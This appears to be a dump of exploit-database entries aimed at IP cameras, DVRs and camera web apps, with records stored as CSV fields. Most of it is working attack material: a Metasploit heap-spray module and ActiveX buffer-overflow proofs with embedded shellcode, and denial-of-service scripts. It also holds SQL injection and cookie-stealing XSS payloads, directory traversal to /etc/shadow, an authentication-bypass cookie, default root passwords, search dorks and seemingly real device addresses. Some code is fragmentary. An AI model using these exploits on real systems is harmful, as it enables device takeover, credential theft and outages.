# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
#If the user is already specified by the user, we'll just use that
# Avoid the attack if the victim doesn't have the same setup we're targeting
# Set payload depending on target
# Convert the pivot addr (in decimal format) to binary,
# and then break it down to this printable format:
# \x41\x41\x41\x41
#{js}","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::HttpServer::HTML
def initialize(info={})
super(update_info(info,
'Name'           => ""TRENDnet SecurView Internet Camera UltraMJCam OpenFileDlg Buffer Overflow"",
'Description'    => %q{
This module exploits a vulnerability found in TRENDnet SecurView Internet
Camera's ActiveX control.  By supplying a long string of data as the sFilter
argument of the OpenFileDlg() function, it is possible to trigger a buffer
overflow condition due to WideCharToMultiByte (which converts unicode back to)
overwriting the stack more than it should, which results arbitrary code execution
under the context of the user.
'License'        => MSF_LICENSE,
'Author'         =>
'rgod',   #Original discovery, PoC
'sinn3r'  #Metasploit
'References'     =>
[ 'OSVDB', '80661' ],
[ 'URL', 'http://www.exploit-db.com/exploits/18675/' ]
'Payload'        =>
'BadChars'        => ""\x00"",
'StackAdjustment' => -3500,
'DefaultOptions'  =>
'ExitFunction'         => ""seh"",
'InitialAutoRunScript' => 'migrate -f',
'Platform'       => 'win',
'Targets'        =>
[ 'Automatic', {} ],
[ 'IE 6 on Windows XP SP3', { 'Offset' => '0x600', 'Ret' => 0x30303030 } ],
[ 'IE 7 on Windows XP SP3', { 'Offset' => '0x600', 'Ret' => 0x30303030 } ],
[ 'IE 7 on Windows Vista',  { 'Offset' => '0x600', 'Ret' => 0x30303030 } ]
'Privileged'     => false,
'DisclosureDate' => ""Mar 28 2012"",
'DefaultTarget'  => 0))
end
def get_target(agent)
return target if target.name != 'Automatic'
if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
return targets[1]  #IE 6 on Windows XP SP3
elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
return targets[2]  #IE 7 on Windows XP SP3
elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
return targets[3]  #IE 7 on Windows Vista
else
return nil
end
end
def on_request_uri(cli, request)
agent = request.headers['User-Agent']
my_target = get_target(agent)
if my_target.nil?
print_error(""#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}"")
send_not_found(cli)
return
end
p = payload.encoded
js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
js_nops = Rex::Text.to_unescape(""\x0c""*4, Rex::Arch.endian(target.arch))
t = [my_target.ret].pack(""V"").unpack(""H*"")[0]
target_ret = ''
0.step(t.length-1, 2) do |i|
target_ret << ""\\x#{t[i, 2]}""
end
js = <<-JS
var heap_obj = new heapLib.ie(0x20000);
var code = unescape(""#{js_code}"");
var nops = unescape(""#{js_nops}"");
while (nops.length < 0x80000) nops += nops;
var offset = nops.substring(0, #{my_target['Offset']});
var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x40000-6)/2);
heap_obj.gc();
for (var i=1; i < 0x1000; i++) {
heap_obj.alloc(block);
var ret = """";
for (i2=0; i2<30000; i2++) {
ret = ret + ""#{target_ret}"";
obj.OpenFileDlg(ret);
JS
js = heaplib(js, {:noobfu => true})
html = <<-EOS
<html>
<head>
<script>
</script>
</head>
<body>
<object classid='clsid:707ABFC2-1D27-4A10-A6E4-6BE6BDF9FB11' id='obj'></object>
<script>
</script>
</body>
</html>
EOS
print_status(""#{cli.peerhost}:#{cli.peerport} - Sending html"")
send_response(cli, html, {'Content-Type'=>'text/html'})
end
end
=begin
bp 1000f952 ""r; g""
bp kernel32!WideCharToMultiByte ""r; dc poi(esp+c); .echo; g""
eax=023f4bf4 ebx=1006519c ecx=00000003 edx=0013a170 esi=00038ce0 edi=00000000
eip=7c80a164 esp=0013a130 ebp=0013a158 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!WideCharToMultiByte:
7c80a164 8bff            mov     edi,edi
023f4bf4  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c04  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c14  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c24  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c34  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c44  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c54  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
023f4c64  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
ChildEBP RetAddr
0013a12c 1000f958 kernel32!WideCharToMultiByte
WARNING: Stack unwind information not available. Following frames may be wrong.
0013a158 100211d0 UltraMJCamX+0xf958
0013e24c 77135cd9 UltraMJCamX!DllUnregisterServer+0xeb20
0013e26c 771362e8 OLEAUT32!DispCallFunc+0x16a
0013e2fc 10017142 OLEAUT32!CTypeInfo2::Invoke+0x234
0013e32c 100170e2 UltraMJCamX!DllUnregisterServer+0x4a92
0013e358 7deac999 UltraMJCamX!DllUnregisterServer+0x4a32
0013e398 7deacfaf mshtml!InvokeDispatchWithNoThis+0x78
0013e3d8 7deac9fc mshtml!COleSite::ContextInvokeEx+0x149
0013e40c 75c71408 mshtml!COleSite::ContextThunk_InvokeEx+0x44
0013e444 75c71378 jscript!IDispatchExInvokeEx2+0xac
0013e47c 75c76db3 jscript!IDispatchExInvokeEx+0x56
0013e4ec 75c710d8 jscript!InvokeDispatchEx+0x78
0013e534 75c6fab8 jscript!VAR::InvokeByName+0xba
0013e574 75c6efea jscript!VAR::InvokeDispName+0x43
0013e598 75c76ff4 jscript!VAR::InvokeByDispID+0xfd
0013e650 75c7165d jscript!CScriptRuntime::Run+0x16bd
0013e668 75c71793 jscript!ScrFncObj::Call+0x8d
0013e6d8 75c5da62 jscript!CSession::Execute+0xa7
0013e728 75c5e6e7 jscript!COleScript::ExecutePendingScripts+0x147
0:008> r
eax=78f8f8f8 ebx=1006519c ecx=020bc038 edx=0c0c0c0c esi=020bf4d0 edi=020c0000
eip=1003a0e9 esp=020bb140 ebp=020bf22c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
UltraMJCamX!DllUnregisterServer+0x27a39:
1003a0e9 8917            mov     dword ptr [edi],edx  ds:0023:020c0000=00905a4d
The only application-specific component loaded is UltraMJCamX.ocx, but this
can be unreliable and I'd rather not use that.
=end"
2012-03-28,Remote,Hardware,rgod,TRENDnet SecurView TV-IP121WN Wireless Internet Camera,UltraMJCam ActiveX Control OpenFileDlg WideCharToMultiByte Remote Stack Buffer Overflow,"http://67.203.184.58:9193/admin/view.cgi?profile=0
/* DISPID=101 */
/* VT_BSTR [8] */
/* VT_BSTR [8] [in] */ $sFilter
/* method OpenFileDlg */
http://67.203.184.58:9193/admin/view.cgi?profile=0
//add user one, user ""sun"" pass ""tzu""","TRENDnet SecurView TV-IP121WN Wireless Internet Camera UltraMJCam ActiveX
Control OpenFileDlg WideCharToMultiByte Remote Stack Buffer Overflow
camera demo
username=guest
password=guest
Background:
The mentioned product, when browsing the device web interface,
asks to install an ActiveX control to stream video content.
It has the following settings:
File version: 1, 1, 52, 18
Product name: UltraMJCam device ActiveX Control
Binary path: C:\WINDOWS\Downloaded Program Files\UltraMJCamX.ocx
ProgID: UltraMJCam.UltraMJCam.1
CLSID: {707ABFC2-1D27-4a10-A6E4-6BE6BDF9FB11}
Implements IObjectSafety: yes
Safe for Scripting (IObjectSafety): True
Safe for Initialization (IObjectSafety): True
Vulnerability:
This ActiveX control exposed the vulnerable
OpenFileDlg() method, see typelib:
function OpenFileDlg(
By invoking this method with an overlong argument is possible
to overflow a buffer. This is because of an insecure
WideCharToMultiByte() call inside UltraMJCamX.ocx:
Call stack of main thread
Address    Stack      Procedure / arguments                                                                                                                   Called from                   Frame
001279FC   77E6F20B   kernel32.77E637DE                                                                                                                       kernel32.77E6F206             00127A0C
00127A10   0299F958   kernel32.WideCharToMultiByte                                                                                                            UltraMJC.0299F952             00127A0C
00127A14   00000003     CodePage = 3
00127A18   00000000     Options = 0
00127A1C   03835C5C     WideCharStr = ""&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
00127A20   FFFFFFFF     WideCharCount = FFFFFFFF (-1.)
00127A24   00127A50     MultiByteStr = 00127A50
00127A28   00007532     MultiByteCount = 7532 (30002.)
00127A2C   00000000     pDefaultChar = NULL
00127A30   00000000     pDefaultCharUsed = NULL
00127A3C   029B11D0   UltraMJC.0299F920                                                                                                                       UltraMJC.029B11CB             00127A38
0299F934   8B45 08          mov eax,dword ptr ss:[ebp+8]
0299F937   C600 00          mov byte ptr ds:[eax],0
0299F93A   6A 00            push 0
0299F93C   6A 00            push 0
0299F93E   8B4D 10          mov ecx,dword ptr ss:[ebp+10]
0299F941   51               push ecx
0299F942   8B55 08          mov edx,dword ptr ss:[ebp+8]
0299F945   52               push edx
0299F946   6A FF            push -1
0299F948   8B45 0C          mov eax,dword ptr ss:[ebp+C]
0299F94B   50               push eax
0299F94C   6A 00            push 0
0299F94E   8B4D 14          mov ecx,dword ptr ss:[ebp+14]
0299F951   51               push ecx
0299F952   FF15 20319F02    call dword ptr ds:[<&KERNEL32.WideCharTo>; kernel32.WideCharToMultiByte <------------
The result is that critical structures are overwritten (SEH)
allowing to execute arbitrary code against the target browser.
As attachment, basic proof of concept code.
TRENDnet SecurView TV-IP121WN Wireless Internet Camera UltraMJCam ActiveX
Control OpenFileDlg() WideCharToMultiByte Remote Buffer Overflow poc
IE7-nodep
camera demo
username=guest
password=guest
rgod
<!-- saved from url=(0014)about:internet -->
<html>
<object classid='clsid:707ABFC2-1D27-4A10-A6E4-6BE6BDF9FB11' id='obj' />
</object>
<script language='javascript'>
shellcode = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u3749%u4949"" +
""%u4949%u4949%u4949%u4949%u4949%u4949%u5a51%u456a"" +
""%u5058%u4230%u4231%u6b41%u4141%u3255%u4241%u3241"" +
""%u4142%u4230%u5841%u3850%u4241%u6d75%u6b39%u494c"" +
""%u5078%u3344%u6530%u7550%u4e50%u716b%u6555%u6c6c"" +
""%u614b%u676c%u3175%u6568%u5a51%u4e4f%u306b%u564f"" +
""%u4c78%u414b%u774f%u4450%u4841%u576b%u4c39%u664b"" +
""%u4c54%u444b%u7841%u466e%u6951%u4f50%u6c69%u6b6c"" +
""%u6f34%u3330%u6344%u6f37%u6a31%u646a%u474d%u4871"" +
""%u7842%u4c6b%u6534%u716b%u5144%u6334%u7434%u5835"" +
""%u6e65%u736b%u646f%u7364%u5831%u756b%u4c36%u644b"" +
""%u624c%u6c6b%u634b%u656f%u574c%u7871%u4c6b%u774b"" +
""%u4c6c%u464b%u7861%u4f6b%u7379%u516c%u3334%u6b34"" +
""%u7073%u4931%u7550%u4e34%u536b%u3470%u4b70%u4f35"" +
""%u7030%u4478%u4c4c%u414b%u5450%u4c4c%u624b%u6550"" +
""%u6c4c%u6e6d%u626b%u6548%u6858%u336b%u6c39%u4f4b"" +
""%u4e70%u5350%u3530%u4350%u6c30%u704b%u3568%u636c"" +
""%u366f%u4b51%u5146%u7170%u4d46%u5a59%u6c58%u5943"" +
""%u6350%u364b%u4230%u7848%u686f%u694e%u3170%u3370"" +
""%u4d58%u6b48%u6e4e%u346a%u464e%u3937%u396f%u7377"" +
""%u7053%u426d%u6444%u756e%u5235%u3058%u6165%u4630"" +
""%u654f%u3133%u7030%u706e%u3265%u7554%u7170%u7265"" +
""%u5353%u7055%u5172%u5030%u4273%u3055%u616e%u4330"" +
""%u7244%u515a%u5165%u5430%u526f%u5161%u3354%u3574"" +
""%u7170%u5736%u4756%u7050%u306e%u7465%u4134%u7030"" +
""%u706c%u316f%u7273%u6241%u614c%u4377%u6242%u524f"" +
""%u3055%u6770%u3350%u7071%u3064%u516d%u4279%u324e"" +
""%u7049%u5373%u5244%u4152%u3371%u3044%u536f%u4242"" +
""%u6153%u5230%u4453%u5035%u756e%u3470%u506f%u6741"" +
""%u7734%u4734%u4570"");
bigblock = unescape(""%u0c0c%u0c0c"");
headersize = 20;
slackspace = headersize+shellcode.length;
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (i=0;i<1888;i++){memory[i] = block+shellcode}
</script>
<script defer=defer>
var x ="""";
for (i=0; i<15000; i++){
x = x + ""&"";
obj.OpenFileDlg(x);
</script>"
2012-03-22,DoS,Windows,rgod,Cisco Linksys WVC200 Wireless-G PTZ Internet Video Camera PlayerPT,ActiveX Control PlayerPT.ocx sprintf Buffer Overflow (PoC),,"Cisco Linksys WVC200 Wireless-G PTZ Internet Video Camera PlayerPT ActiveX
Control PlayerPT.ocx sprintf Buffer Overflow Vulnerability
when viewing the device web interface it asks
to install an ActiveX control with the following settings:
ProductName: PlayerPT ActiveX Control Module
File version: 1.0.0.15
Binary path: C:\WINDOWS\system32\PlayerPT.ocx
CLSID: {9E065E4A-BD9D-4547-8F90-985DC62A5591}
ProgID: PLAYERPT.PlayerPTCtrl.1
Safe for scripting (registry): True
Safe for initialization (registry): True
try this google dork for WVC200:
linksys wireless-g ptz inurl:main.cgi
Vulnerability:
the SetSource() method is vulnerable to a buffer overflow
vulnerability. Quickly, ollydbg dump:
03238225   8B5424 20        mov edx,dword ptr ss:[esp+20]
03238229   894424 10        mov dword ptr ss:[esp+10],eax
0323822D   B9 32000000      mov ecx,32
03238232   33C0             xor eax,eax
03238234   8B72 F8          mov esi,dword ptr ds:[edx-8]
03238237   8DBC24 E8020000  lea edi,dword ptr ss:[esp+2E8]
0323823E   F3:AB            rep stos dword ptr es:[edi]
03238240   8B3D 0C062603    mov edi,dword ptr ds:[<&MSVCRT.sprintf>] ; msvcrt.sprintf
03238246   52               push edx
03238247   8D8C24 EC020000  lea ecx,dword ptr ss:[esp+2EC]
0323824E   68 48612603      push PlayerPT.03266148                   ; ASCII ""%s""
03238253   51               push ecx
03238254   FFD7             call edi <---------------boom
rgod
<!-- saved from url=(0014)about:internet -->
<HTML>
<object classid='clsid:9E065E4A-BD9D-4547-8F90-985DC62A5591' id='obj' />
</object>
<script>
var x="""";
for (i=0; i<13999; i++){
x = x + ""aaaa"";
obj.SetSource("""","""","""","""",x);
</script>"
2010-11-13,DoS,Hardware,Trustwave's SpiderLabs,Camtron CMNC-200 IP Camera,Denial of Service,#!/usr/bin/perl,"Finding 5: Camera Denial of Service
CVE: CVE-2010-4234
The CMNC-200 IP Camera has a built-in web server that
is vulnerable to denial of service attacks. Sending multiple
requests in parallel to the web server may cause the camera
to reboot.
Requests with long cookie header makes the IP camera reboot a few
seconds faster, however the same can be accomplished with requests
of any size.
The example code below is able to reboot the IP cameras in
less than a minute in a local network.
use LWP::UserAgent;
while (1 == 1){
$ua = new LWP::UserAgent;
$ua->agent(""Mozilla/5.0 (X11; U; Linux i686; en-US;
rv:1.8.1.6)"");
$req = HTTP::Request->new(GET => 'http://192.168.10.100');
$req->header(Accept =>
""text/xml,application/xml,application/xhtml+xml,text/html
;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"");
$req->header(""Keep-Alive"" => 0);
$req->header(Connection => ""close"");
$req->header(""If-Modified-Since"" => ""Mon, 12 Oct 2009
02:06:34 GMT"");
$req->header(Cookie =>
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"");
my $res = $ua->request($req);"
2010-11-13,WebApps,Hardware,Trustwave's SpiderLabs,Camtron CMNC-200 IP Camera,Undocumented Default Accounts,,"Finding 4: Undocumented Default Accounts
CVE: CVE-2010-4233
The CMNC-200 IP Camera has undocumented default
accounts on its Linux operating system. These accounts can
be used to login via the cameras telnet interface, which
cannot be normally disabled. The usernames and passwords are
listed below.
User: root     Password: m
User: mg3500   Password: merlin
Vendor Response:
No response received.
Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation."
2010-11-13,WebApps,Hardware,Trustwave's SpiderLabs,Camtron CMNC-200 IP Camera,Authentication Bypass,"http://www.ipcamera.com/system.html
http://www.ipcamera.com//system.html","Finding 3: Web Based Administration Interface Bypass
CVE: CVE-2010-4232
The CMNC-200 IP Camera has an administrative web
interface that does not handle authentication properly.
Using a properly formatted request, an attacker can bypass
the authentication mechanism.
The first example requires authentication:
When a second forward slash is placed after the hostname,
authentication is not required.
This vulnerability allows an attacker to take full control of
the IP Camera.
Vendor Response:
No response received.
Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation."
2010-11-13,Remote,Hardware,Trustwave's SpiderLabs,Camtron CMNC-200 IP Camera,Directory Traversal,,"Finding 2: Directory Traversal in Camera Web Server
CVE: CVE-2010-4231
The CMNC-200 IP Camera has a built-in web server that
is enabled by default. The server is vulnerable to directory
transversal attacks, allowing access to any file on the
camera file system.
The following example will display the contents of
/etc/passwd:
GET /../../../../../../../../../../../../../etc/passwd
HTTP/1.1
Because the web server runs as root, an attacker can read
critical files like /etc/shadow from the web-based
administration interface. Authentication is not required for
exploitation.
Vendor Response:
No response received.
Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation."
2010-11-13,DoS,Hardware,Trustwave's SpiderLabs,Camtron CMNC-200 IP Camera,ActiveX Buffer Overflow,,"Finding 1: Buffer Overflow in ActiveX Control
CVE: CVE-2010-4230
The CMNC-200 IP Camera ActiveX control identified by
CLSID {DD01C8CA-5DA0-4B01-9603-B7194E561D32} is vulnerable
to a stack overflow on the first argument of the connect method.
The vulnerability can be used to set the EIP register,
allowing a reliable exploitation.
The example code below triggers the vulnerability.
<html>
<head><title>IPcam POC</title>
<script>
function Check(){
var bf1 = 'A';
while (bf1.length <= 6144) bf1 = bf1 + 'A';
obj.connect(bf1,""BBBB"",""CCCC"");
</script>
</head>
<body onload="" Check();"">
<object classid=""clsid:DD01C8CA-5DA0-4B01-9603-B7194E561D32""
id=""obj"">
</object>
</html></body>
Vendor Response:
No response received.
Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation."
2010-08-01,WebApps,Hardware,Magnefikko,Intellinet IP Camera MNC-L10,Authentication Bypass,,"by Magnefikko
Discovered: 25.01.2009
Publication: 01.08.2010
magnefikko@gmail.com
Promhyl Studies :: http://promhyl.tk
Inj3ct0r Team :: http://inj3ct0r.com
Subgroup: #PRekambr
Name: Intellinet IP Camera Admin Access
Platform: Intellinet IP Camera MNC-L10 and other
...:: Exploit ::...
JS is required.
1. Go to http://cameraip/main_configure.cgi
2. Write in address bar:
--- code ---
javascript:document.cookie=""user_auth_level=43"";document.location=document.location
--- code ---
3. Push enter.
or add cookie with another method.
----== Promhyl Studies :: http://promhyl.tk ==----
----== Inj3ct0r Team :: http://inj3ct0r.com ==----"
2009-07-01,DoS,Hardware,Stack,ARD-9808 DVR Card Security Camera,GET Remote Denial of Service,# milw0rm.com [2009-07-01],"import socket
import sys
print ""----------------------------------------------------------------""
print "" ARD-9808 DVR Card Security Camera <= Remote Denial Of Service  ""
print "" author: Stack                                                  ""
print ""----------------------------------------------------------------""
host = ""127.0.0.1""
port = 80
try:
buff = ""//.\\"" * 1000
request =  ""GET "" + buff + "" HTTP/1.0""
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((host, port))
connection.send(request)
raw_input('\n\nExploit completed. Press ""Enter"" to quit...')
sys.exit
except:
raw_input('\n\nUnable to connect. Press ""Enter"" to quit...')"
2009-07-01,Remote,Hardware,Septemb0x,ARD-9808 DVR Card Security Camera,Arbitrary Configuration Disclosure,# milw0rm.com [2009-07-01],"SoftWare Name : ARD-9808 DVR Card Security Camera Passwords View Bug
Author : Septemb0x
Web Site : www.ozkanbozkurt.com
Procuts Site : http://www.armassa.com.tr/shop/category.php?sid=C2B7D6B59AF75CF88011987A080A46FD&id=87789673
Software Download : http://www.armassa.com.tr/shop/down/ard9808.rar = Open To Rar > DVR > Dvr.ini
D0rk : ""To enable control work: Tools->Internet Options->Security->Custom Level   Reset to: Low Or Download""
Exploit: http://[sitename-ipadress]/dvr.ini
Example: http://88.249.248.177/dvr.ini
Show;
[PASSWORD]
administrator=
password_a=
user=
password=
enable=0
user0=ozcan = Camera Username
password0=3893 = Camera Password
right0=223
encode=1
num=2
user1=yurt
password1=yurt
right1=223
... Login The Camera :)
Greetz : BHDR, BARCOD3"
2008-10-09,WebApps,PHP,BackDoor,Camera Life 2.6.2b4,SQL Injection / Cross-Site Scripting,"http://chrisnolan.org/cameralife/album.php?id=-1+union+select+0,password,username,3,4,5+from+users
http://chrisnolan.org/cameralife/topic.php?name=""><script>alert(document.cookie)</script>
# milw0rm.com [2008-10-09]","Cameralife 2.6.2b4 (SQL/XSS) Multiple Remote Vulnerabilities
Script:Cameralife 2.6.2b4
Download:http://nchc.dl.sourceforge.net/sourceforge/fdcl/cameralife-2.6.2b4.zip
Author:BackDoor
Bug 1;album.php Remote SQL Injection Vulnerability
Exploit:www.target.com/scriptpath/album.php?id=-1+union+select+0,password,username,3,4,5+from+users
Live
Bug 2;topic.php XSS Vulnerability
Exploit:www.target.com/scriptpath/topic.php?name=""><script>alert(document.cookie)</script>
Live
Dork:inurl:""cameralife/index.php""
BackDoor Cyber-Security.TIM //Lojistik"
2008-09-27,WebApps,PHP,Mi4night,Camera Life 2.6.2b4,Arbitrary File Upload,# milw0rm.com [2008-09-27],"[+] CameraLife-2.6.2b4 Arbitrary File Upload Vulnerability
[+] Author:Mi4night
[+] Version:cameralife-2.6.2b4
[+] Download Script:
[+] http://sourceforge.net/project/showfiles.php?group_id=70910&package_id=70316&release_id=628868
[+] Exploit:
[+] http://127.0.0.1/cameralife/images/photos/upload/Mi4night/yourshell.php
[+] Description:
[+] After registering you can upload php files which you can access just like in the exploit section! Change Mi4night with your username.
[+] Greets to : nuclear, cAs,zYzTeM, Sys32-Hack, Pepe, G-Emp!RE, ThaWhiteNigga, *Z.i.P*,THE_MAN, I-O-W-A, Digitalfortress, DiGitalX, sys32r, pentest, Pig, d3v1l, watchdog, Gibon"
2008-07-25,WebApps,PHP,nuclear,Camera Life 2.6.2,'id' SQL Injection,"#Camera Life 2.6.2(id) Sql Injection Vulnerability
#Author: nuclear
#script: http://downloads.sourceforge.net/fdcl/cameralife-2.6.2aa.zip
#exploit: sitemap.xml.php?page=photos&id=999999 union select concat(username,0x3a,password),null from users --
#greetz cAs, Mi4night, zYzTeM ,THE_MAN, DiGitalX, sys32r, sys32-hack, Digitalfortress, and me :P
# milw0rm.com [2008-07-25]",
2007-07-03,Remote,Windows,shinnai,AXIS Camera Control (AxisCamControl.ocx 1.0.2.15),Remote Buffer Overflow,# milw0rm.com [2007-07-03],"<pre>
<code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-----------------------------------------------------------------------------------------------
<b>[PoC] AXIS Camera Control (AxisCamControl.ocx v. 1.0.2.15) ""SaveBMP()"" Method Buffer Overflow</b>
original advisory: http://secunia.com/advisories/25093/
author: shinnai
mail: shinnai[at]autistici[dot]org
site: http://shinnai.altervista.org
<b><font color='red'>Even if this bug was published on 2007/05/04 and the vendor release a new
version of this ocx, there are a lot of site that still use the old one.</font></b>
Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
all software that use this ocx are vulnerable to this exploits.
<object classid='clsid:917623D1-D8E5-11D2-BE8B-00104B06BDE3' id='test'></object>
<input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">
<script language = 'vbscript'>
Sub tryMe()
buff      = String(200, ""A"")
get_EIP   = unescape(""%6B%AC%3F%7E"") '0x7E3FAC6B call EBP from user32.dll
exception = unescape(""%EB%AA%3F%7E"") 'just a valid address so: 0x7E3FAAEB call ESP from user32.dll
nop       = String(24, unescape(""%90""))
shellcode = unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _
unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _
unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _
unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _
unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _
unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _
unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _
unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _
unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _
unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _
unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _
unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _
unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _
unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _
unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _
unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _
unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _
unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _
unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _
unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _
unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _
unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"")
egg       = buff + get_EIP + exception + nop + shellcode + nop
test.SaveBMP egg
End Sub
</script>
</span></span>
</code></pre>"
2007-06-27,DoS,Windows,str0ke,Sony Network Camera SNC-P5 1.0,ActiveX viewer Heap Overflow (PoC),"http://bssc.sel.sony.com/BroadcastandBusiness/DisplayModel?id=79540
http://www.tracor-europe.info/racine/sony/PROG/P5/API/Documents/SNC-P5APIDocument1.0EN.pdf
# milw0rm.com [2007-06-27]","Sony Network Camera SNC-P5 v1.0 ActiveX viewer Heap Overflow PoC
Camera info
SNC-P5 External API documentation
/str0ke ! milw0rm.com
<script language = 'vbscript'>
Sub tryMe()
buff = String(15000, ""A"")
viewer.PrmSetNetworkParam buff, 1
End Sub
</script>
<OBJECT CLASSID=""CLSID:5CB430A9-CAAC-4C91-AF61-6D410EEE1221"" id=""viewer""> </OBJECT>
<input language=VBScript onclick=tryMe() type=button value=""Click Me"">"
2004-08-31,Remote,Hardware,anonymous,D-Link DCS-900 Camera,Remote IP Address Changer,"http://www.dlink.com.au/Default.aspx?ArticleID=109
#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
//libnet_diag_dump_pblock(p);
// milw0rm.com [2004-08-31]","dlinkdown.c - miscname.com
change ip address on all dlink dcs-900 cameras on the local network without authentication
dlink dcs-900 ip cameras use a broadcast/listen method of configuration ...
rather than a static ip addr out of the box, it listens for a 62976/udp broadcast packet
telling it what ip addr to set itself too
rtfs and mod the ip address to set all listening cameras too (default is 10.0.50.50)
int main (int argc, char *argv[]) {
libnet_t *p;
libnet_ptag_t ip, udp, ipoptions, ether;
u_long srcip, dstip;
u_short srcport = 62976, dstport = 62976, x;
signed int ret;
char errbuff[LIBNET_ERRBUF_SIZE], ipopt[21];
int len;
int8_t *macdst = ""ff:ff:ff:ff:ff:ff"";
u_int8_t *macdest;
char payload[128] = ""\xfd\xfd\x00\x04\x00\x03\x00\x0f\x3d\x56\x97\x07""
""\x0a\x00\x32\x32"" /* ip address to set too */
""\x00\x00\xff\xff\xff\x00\x00\x00\x00\x00"";
u_short payloadlen = strlen(payload);
srcip = libnet_get_ipaddr4(p); /* mod to spoof */
dstip = libnet_name2addr4(p,""255.255.255.255"",LIBNET_DONT_RESOLVE); /* 255.255.255.255 */
udp = ip = ether = ipoptions = 0;
